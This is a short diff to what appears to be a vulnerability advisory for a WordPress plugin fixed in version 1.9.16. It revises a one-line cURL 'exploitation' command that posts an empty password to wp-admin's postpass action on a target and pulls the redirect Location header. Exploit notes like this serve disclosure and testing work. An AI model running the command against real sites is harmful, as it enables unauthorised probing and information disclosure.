@@ -9,7 +9,7 @@ Patched version: 1.9.16
 ## Exploitation cURL command
 
 ```bash
-curl -X POST -sk https://$target/wp-admin/?action=postpass -d 'post_password=' | grep -i location | cut -d ' ' -f 2- | cut -d '?' -f 1
+curl -X POST https://$target/wp-admin/?action=postpass -d 'post_password=' -sko /dev/null -D - | grep -i ^location | cut -d ' ' -f 2- | cut -d '?' -f 1
 ```
 
 ## Exploitation Python script
